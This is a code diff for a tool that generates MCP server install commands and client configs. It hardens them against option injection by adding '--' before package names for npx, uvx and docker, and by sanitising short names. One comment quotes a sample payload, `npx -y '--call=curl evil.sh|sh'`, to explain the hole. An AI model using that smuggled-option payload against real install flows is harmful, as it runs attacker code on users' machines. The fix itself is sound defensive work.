@@ -33,6 +33,17 @@ export function shellArg(v: string): string {
   return `'${v.replaceAll("'", "'\\''")}'`;
 }
 
+// Quoting alone is NOT enough, and this was found by review after the first fix shipped.
+// Shell quoting makes a value ONE token; it does not stop the CALLEE parsing that token as
+// an option. `npx -y '--call=curl evil.sh|sh'` is a single shell word and npx runs the
+// payload - confirmed by execution, not theory. The same value in the JSON blocks reaches
+// npx through argv with no shell in the path at all, so quoting was never relevant there.
+//
+// `--` is the actual fix: it terminates option parsing, so everything after it is a package
+// name. Verified: `npx -y -- '--call=...'` treats the payload as a package name and does not
+// execute it. Applied to every runner (npx, uvx, docker run), in both the shell commands and
+// the argv arrays.
+
 function envBlock(s: IndexedServer): Record<string, string> | undefined {
   if (!s.envVars.length) return undefined;
   const env: Record<string, string> = {};
@@ -51,6 +62,10 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
     out.push({
       client: 'remote',
       label: 'Remote endpoint',
+      // NOT shell-quoted, deliberately. A round-2 review flagged this as an unquoted sink and
+      // the quoting broke 216 real listings: this value is a URL pasted into a client's
+      // config field (see `notes` below), never interpolated into a shell command anywhere,
+      // so `'https://{api_host}/mcp'` is simply wrong. safeUrl() already gates the protocol.
       command: s.remoteUrl,
       notes: 'Streamable HTTP / SSE endpoint. Add to any MCP client that supports remote servers.',
     });
@@ -66,7 +81,7 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
           mcpServers: {
             [shortName(s)]: {
               command: 'npx',
-              args: ['-y', s.npmPackage],
+              args: ['-y', '--', s.npmPackage],
               ...(env ? { env } : {}),
             },
           },
@@ -83,7 +98,7 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
           mcpServers: {
             [shortName(s)]: {
               command: 'npx',
-              args: ['-y', s.npmPackage],
+              args: ['-y', '--', s.npmPackage],
               ...(env ? { env } : {}),
             },
           },
@@ -95,18 +110,18 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
     out.push({
       client: 'cline',
       label: 'Cline (cline_mcp_settings.json)',
-      command: `npx -y ${shellArg(s.npmPackage)}`,
+      command: `npx -y -- ${shellArg(s.npmPackage)}`,
     });
     const name = shortName(s);
     out.push({
       client: 'claude-code',
       label: 'Claude Code (claude mcp add)',
-      command: `claude mcp add --scope user ${name} -- npx -y ${shellArg(s.npmPackage)}`,
+      command: `claude mcp add --scope user ${name} -- npx -y -- ${shellArg(s.npmPackage)}`,
     });
     out.push({
       client: 'gemini-cli',
       label: 'Gemini CLI (gemini mcp add)',
-      command: `gemini mcp add -s user ${name} npx -y ${shellArg(s.npmPackage)}`,
+      command: `gemini mcp add -s user ${name} npx -y -- ${shellArg(s.npmPackage)}`,
     });
   }
 
@@ -120,7 +135,7 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
           mcpServers: {
             [shortName(s)]: {
               command: 'uvx',
-              args: [s.pypiPackage],
+              args: ['--', s.pypiPackage],
               ...(env ? { env } : {}),
             },
           },
@@ -141,7 +156,7 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
           mcpServers: {
             [shortName(s)]: {
               command: 'docker',
-              args: ['run', '--rm', '-i', s.dockerImage],
+              args: ['run', '--rm', '-i', '--', s.dockerImage],
               ...(env ? { env } : {}),
             },
           },
@@ -156,5 +171,9 @@ export function buildInstalls(s: IndexedServer): InstallTarget[] {
 }
 
 function shortName(s: IndexedServer): string {
-  return s.name.split('/').pop()!.replace(/[^a-zA-Z0-9-_]/g, '-');
+  // An empty result would collapse two argv slots together ("claude mcp add --scope user
+  // <blank> -- npx"), and a leading '-' would be parsed as an option by the CLI receiving it.
+  const raw = s.name.split('/').pop() ?? '';
+  const cleaned = raw.replace(/[^a-zA-Z0-9-_]/g, '-').replace(/^-+/, '');
+  return cleaned || 'mcp-server';
 }
